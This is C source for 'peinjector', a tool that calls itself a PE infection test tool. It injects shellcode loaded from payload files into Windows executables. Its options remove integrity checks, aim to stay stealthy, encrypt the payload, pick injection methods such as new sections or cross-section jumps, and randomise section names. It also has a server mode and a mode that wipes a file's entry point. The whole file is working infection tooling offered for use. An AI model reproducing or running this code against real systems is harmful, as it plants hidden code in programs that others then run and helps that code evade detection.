/**
 * \file   peinjector.c
 * \author A.A.
 * \brief  PE infection test tool
 */

#include "libpetool.h"
#include "libpeinfect.h"
#include "libpeserver.h"
#include "3rdparty/ini/minIni.h"
#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32 /* Windows/Linux Switch */
#include "windows.h"
#endif

/* Config Names */
#define CONFIG_FILE      "config.ini"
#define PAYLOAD_FILE_X86 "payload_x86.bin"
#define PAYLOAD_FILE_X64 "payload_x64.bin"

/**
 * Reads binary file
 *
 * \param file    File to read
 * \param memsize Store size of file
 *
 * \return file memory if success, NULL otherwise
 * */
static inline unsigned char* __read_file(char *file, size_t *memsize) {
  unsigned char *file_mem;
  /* Open file */
  FILE *fh = fopen(file, "rb");

  if (fh != NULL) {
    /* Get file size and allocate buffer */
    fseek(fh, 0L, SEEK_END);
    size_t size = ftell(fh);
    size_t size_read = 0;
    rewind(fh);
    file_mem = malloc(size);

    if (file_mem != NULL) {
      /* Load file into buffer */
      size_read = fread(file_mem, size, 1, fh);
      fclose(fh);
      fh = NULL;

      if (size_read != 1) {
        free(file_mem);
        file_mem = NULL;
      }
      
      /* Return buffer */
      *memsize = size;
      return file_mem;
    }
    /* Close file (if memory allocation has failed) */
    if (fh != NULL) {
      fclose(fh);
    }
  }

  return NULL;
}

/**
 * Configures PEINFCT
 *
 * \param infect PEINFECT to configure
 *
 * */
static inline void __load_config(PEINFECT *infect) {
  unsigned char *test_code_x86;
  size_t test_codesize_x86 = 0;
  unsigned char *test_code_x64;
  size_t test_codesize_x64 = 0;
  PEINFECT_METHOD methods = 0;
  bool random_section_name = false;
  size_t section_namesize = 0;
  char section_name[NT_SHORT_NAME_LEN] = { 0 };

  /* Load integrity options */
  peinfect_set_removeintegrity(ini_getl("integrity", "remove_integrity_checks", true, CONFIG_FILE), infect);
  peinfect_set_trystaystealth(ini_getl("integrity", "try_stay_stealth", true, CONFIG_FILE), infect);

  /* Load statistics options */
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x86", 0, CONFIG_FILE), false, infect);
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x64", 0, CONFIG_FILE), true, infect);

  /* Load methods */
  methods |= ini_getl("methods", "method_alignment", true, CONFIG_FILE) ? METHOD_ALIGNMENT : 0;
  methods |= ini_getl("methods", "method_alignment_resize", true, CONFIG_FILE) ? METHOD_ALIGNMENT_RESIZE : 0;
  methods |= ini_getl("methods", "method_new_section", true, CONFIG_FILE) ? METHOD_NEW_SECTION : 0;
  methods |= ini_getl("methods", "method_change_flags", true, CONFIG_FILE) ? METHOD_CHANGE_FLAGS : 0;
  methods |= ini_getl("methods", "method_cross_section_jump", false, CONFIG_FILE) ? METHOD_CROSS_SECTION_JUMP : 0;
  peinfect_set_methods(methods, infect);

  /* Cross section jump iterations */
  peinfect_set_jumpiterations(ini_getl("methods", "method_cross_section_jump_iterations", 1, CONFIG_FILE), infect);

  /* Encryption */
  peinfect_set_encrypt(ini_getl("methods", "encrypt", true, CONFIG_FILE), infect);
  peinfect_set_encryptiterations(ini_getl("methods", "encrypt_iterations", 1, CONFIG_FILE), infect);

  /* New Section Name */
  peinfect_set_sectionname(NULL, 0, (random_section_name = ini_getl("name", "section_name_random", true, CONFIG_FILE)),
      infect);
  if (!random_section_name) {
    section_namesize = ini_gets("name", "section_name", "", section_name, NT_SHORT_NAME_LEN, CONFIG_FILE);
    peinfect_set_sectionname(section_name, section_namesize, false, infect);
  }

  /* Statistics */
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x86", 0, CONFIG_FILE), false, infect);
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x64", 0, CONFIG_FILE), true, infect);

  /* Load shellcode */
  test_code_x86 = __read_file(PAYLOAD_FILE_X86, &test_codesize_x86);
  test_code_x64 = __read_file(PAYLOAD_FILE_X64, &test_codesize_x64);

  /* Set shellcode */
  peinfect_set_shellcode(test_code_x86, test_codesize_x86, false, infect);
  peinfect_set_shellcode(test_code_x64, test_codesize_x64, true, infect);

  /* Free temp. Buffer */
  if (test_code_x86 != NULL) {
    free(test_code_x86);
  }
  if (test_code_x64 != NULL) {
    free(test_code_x64);
  }
}

/**
 * Prints PEFILE info
 *
 * \param in PEFILE to print
 *
 * */
static inline void __print_info(PEFILE *in) {
  int i = 0;

  printf("# PE Header #\n");
  printf("Signature:                   %08x\n", in->pe_header.Signature);
  printf("Machine:                     %04x\n", in->pe_header.Machine);
  printf("NumberofSections:            %04x\n", in->pe_header.NumberOfSections);
  printf("TimeDateStamp:               %08x\n", in->pe_header.TimeDateStamp);
  printf("PointerToSymbolTable:        %08x\n", in->pe_header.PointerToSymbolTable);
  printf("NumberOfSymbols:             %08x\n", in->pe_header.NumberOfSymbols);
  printf("SizeOfOptionalHeader:        %04x\n", in->pe_header.SizeOfOptionalHeader);
  printf("Characteristics:             %04x\n", in->pe_header.Characteristics);
  printf("\n");

  if (in->pe_header.SizeOfOptionalHeader) {
    if (in->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      printf("# Optional Header (32 Bit) #\n");
      printf("Magic:                       %04x\n", in->optional_header_32.Magic);
      printf("MajorLinkerVersion:          %02x\n", in->optional_header_32.MajorLinkerVersion);
      printf("MinorLinkerVersion:          %02x\n", in->optional_header_32.MinorLinkerVersion);
      printf("SizeOfCode:                  %08x\n", in->optional_header_32.SizeOfCode);
      printf("SizeOfInitializedData:       %08x\n", in->optional_header_32.SizeOfInitializedData);
      printf("SizeOfUninitializedData:     %08x\n", in->optional_header_32.SizeOfUninitializedData);
      printf("AddressOfEntryPoint:         %08x\n", in->optional_header_32.AddressOfEntryPoint);
      printf("BaseOfCode:                  %08x\n", in->optional_header_32.BaseOfCode);
      printf("BaseOfData:                  %08x\n", in->optional_header_32.BaseOfData);
      printf("ImageBase:                   %08x\n", in->optional_header_32.ImageBase);
      printf("SectionAlignment:            %08x\n", in->optional_header_32.SectionAlignment);
      printf("FileAlignment:               %08x\n", in->optional_header_32.FileAlignment);
      printf("MajorOperatingSystemVersion: %04x\n", in->optional_header_32.MajorOperatingSystemVersion);
      printf("MinorOperatingSystemVersion: %04x\n", in->optional_header_32.MinorOperatingSystemVersion);
      printf("MajorImageVersion:           %04x\n", in->optional_header_32.MajorImageVersion);
      printf("MinorImageVersion:           %04x\n", in->optional_header_32.MinorImageVersion);
      printf("MajorSubsystemVersion:       %04x\n", in->optional_header_32.MajorSubsystemVersion);
      printf("MinorSubsystemVersion:       %04x\n", in->optional_header_32.MinorSubsystemVersion);
      printf("Win32VersionValue:           %08x\n", in->optional_header_32.Win32VersionValue);
      printf("SizeOfImage:                 %08x\n", in->optional_header_32.SizeOfImage);
      printf("SizeOfHeaders:               %08x\n", in->optional_header_32.SizeOfHeaders);
      printf("CheckSum:                    %08x\n", in->optional_header_32.CheckSum);
      printf("Subsystem:                   %04x\n", in->optional_header_32.Subsystem);
      printf("DllCharacteristics:          %04x\n", in->optional_header_32.DllCharacteristics);
      printf("SizeOfStackReserve:          %08x\n", in->optional_header_32.SizeOfStackReserve);
      printf("SizeOfStackCommit:           %08x\n", in->optional_header_32.SizeOfStackCommit);
      printf("SizeOfHeapReserve:           %08x\n", in->optional_header_32.SizeOfHeapReserve);
      printf("SizeOfHeapCommit:            %08x\n", in->optional_header_32.SizeOfHeapCommit);
      printf("LoaderFlags:                 %08x\n", in->optional_header_32.LoaderFlags);
      printf("NumberOfRvaAndSizes:         %08x\n", in->optional_header_32.NumberOfRvaAndSizes);

    } else if (in->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC) {
      printf("# Optional Header (64 Bit) #\n");

      printf("Magic:                       %04x\n", in->optional_header_64.Magic);
      printf("MajorLinkerVersion:          %02x\n", in->optional_header_64.MajorLinkerVersion);
      printf("MinorLinkerVersion:          %02x\n", in->optional_header_64.MinorLinkerVersion);
      printf("SizeOfCode:                  %08x\n", in->optional_header_64.SizeOfCode);
      printf("SizeOfInitializedData:       %08x\n", in->optional_header_64.SizeOfInitializedData);
      printf("SizeOfUninitializedData:     %08x\n", in->optional_header_64.SizeOfUninitializedData);
      printf("AddressOfEntryPoint:         %08x\n", in->optional_header_64.AddressOfEntryPoint);
      printf("BaseOfCode:                  %08x\n", in->optional_header_64.BaseOfCode);
      printf("ImageBase:                   %016x\n", (uint32_t) in->optional_header_64.ImageBase);
      printf("SectionAlignment:            %08x\n", in->optional_header_64.SectionAlignment);
      printf("FileAlignment:               %08x\n", in->optional_header_64.FileAlignment);
      printf("MajorOperatingSystemVersion: %04x\n", in->optional_header_64.MajorOperatingSystemVersion);
      printf("MinorOperatingSystemVersion: %04x\n", in->optional_header_64.MinorOperatingSystemVersion);
      printf("MajorImageVersion:           %04x\n", in->optional_header_64.MajorImageVersion);
      printf("MinorImageVersion:           %04x\n", in->optional_header_64.MinorImageVersion);
      printf("MajorSubsystemVersion:       %04x\n", in->optional_header_64.MajorSubsystemVersion);
      printf("MinorSubsystemVersion:       %04x\n", in->optional_header_64.MinorSubsystemVersion);
      printf("Win32VersionValue:           %08x\n", in->optional_header_64.Win32VersionValue);
      printf("SizeOfImage:                 %08x\n", in->optional_header_64.SizeOfImage);
      printf("SizeOfHeaders:               %08x\n", in->optional_header_64.SizeOfHeaders);
      printf("CheckSum:                    %08x\n", in->optional_header_64.CheckSum);
      printf("Subsystem:                   %04x\n", in->optional_header_64.Subsystem);
      printf("DllCharacteristics:          %04x\n", in->optional_header_64.DllCharacteristics);
      printf("SizeOfStackReserve:          %016x\n", (uint32_t) in->optional_header_64.SizeOfStackReserve);
      printf("SizeOfStackCommit:           %016x\n", (uint32_t) in->optional_header_64.SizeOfStackCommit);
      printf("SizeOfHeapReserve:           %016x\n", (uint32_t) in->optional_header_64.SizeOfHeapReserve);
      printf("SizeOfHeapCommit:            %016x\n", (uint32_t) in->optional_header_64.SizeOfHeapCommit);
      printf("LoaderFlags:                 %08x\n", in->optional_header_64.LoaderFlags);
      printf("NumberOfRvaAndSizes:         %08x\n", in->optional_header_64.NumberOfRvaAndSizes);
    }
    printf("\n");
  }

  if (in->pe_header.NumberOfSections) {
    printf("# Sections #\n");
    printf("Name     VirtualSize VirtualAddr. SizeofRawData PointerToRawData Characteristics\n");
    for (i = 0; i < in->pe_header.NumberOfSections; ++i) {
      printf("%-8.*s %08x    %08x     %08x      %08x         %08x\n", 8, in->section_header[i].Name,
          in->section_header[i].Misc.VirtualSize, in->section_header[i].VirtualAddress,
          in->section_header[i].SizeOfRawData, in->section_header[i].PointerToRawData,
          in->section_header[i].Characteristics);
    }
    printf("\n");
  }

}

/**
 * Prints usage information
 */
static void __print_usage() {
  printf(
      " <<< Usage >>> \n\
  peinjector --info file\n\
  peinjector --infect file\n\
  peinjector --patch file (Debug Output)\n\
  peinjector --server\n\
  peinjector --accidentally-forget-entry-point file\n");
}

/**
 * Main Routine
 *
 * \param pcount Number of parameter given
 * \param params Parameters given
 *
 * \returns 0
 */
int main(int pcount, char **params) {
  bool restart_server = true;

  /* Server */
  PESERVER server;
  /* Server config */
  PECONFIG config;
  peserver_init_config(CONFIG_FILE, PAYLOAD_FILE_X86, PAYLOAD_FILE_X64, &config);

  /* PE File */
  PEFILE mype;
  pefile_init(&mype);

  PEFILE_READ_OPTIONS read_options;
  read_options.header_only = true;

  /* PE Inject */
  PEINFECT infect;
  peinfect_init(&infect);

  /* Check Params */
  if (pcount == 3) {

    /* Statically infect file */
    if (strcmp("--infect", params[1]) == 0) {
      printf(" <<< Infect >>> \n");

      __load_config(&infect);
      if (peinfect_infect_full_file(params[2], &infect, params[2])) {
        printf("Success\n");
      } else {
        printf("Error\n");
      }

      /* Show patch parts (debug) */
    } else if (strcmp("--patch", params[1]) == 0) {
      printf(" <<< Try patch >>> \n");

      __load_config(&infect);
      if (peinfect_infect_patch_file(params[2], &infect)) {
        printf("Success\n");
      } else {
        printf("Error\n");
      }

      /* Show Info */
    } else if (strcmp("--info", params[1]) == 0) {
      printf(" <<< Info >>> \n");

      if (pefile_read_file(params[2], &read_options, &mype)) {
        __print_info(&mype);
      } else {
        printf("Error\n");
      }

    } else if (strcmp("--accidentally-forget-entry-point", params[1]) == 0) {
      printf(" <<< Oooops ... >>> \n");
      printf("When I'm drunk I always fuck up PE files entry points ...\n");

      if (pefile_read_file(params[2], NULL, &mype)) {
        mype.optional_header_32.AddressOfEntryPoint = 0;
        mype.optional_header_64.AddressOfEntryPoint = 0;
        if (pefile_write_file(&mype, NULL, params[2])) {
          printf("Success\n");
        } else {
          printf("Error writing file\n");
        }

      } else {
        printf("Error parsing file\n");
      }
      /* Invalid parameter combination */
    } else {
      __print_usage();
    }

  } else if ((pcount == 2) && (strcmp("--server", params[1]) == 0)) {

    /* Restart loop */
    restart_server = true;
    while (restart_server) {
      /* Init Server */
      __load_config(&infect);
      if (peserver_init(&infect, &config, &server)) {
        /* Wait for termination signal */
        restart_server = peserver_wait(&server);

        /* Frees the server */
        peserver_free(&server);

      } else {
        /* Couldn't (re)start server, exit */
        restart_server = false;
      }
    }

    /*Frees config*/
    peserver_free_config(&config);

    /* Invalid parameter combination */
  } else {
    __print_usage();
  }

  /* Free PEFILE & PEINFECT */
  pefile_free(&mype);
  peinfect_free(&infect);

  return 0;
}
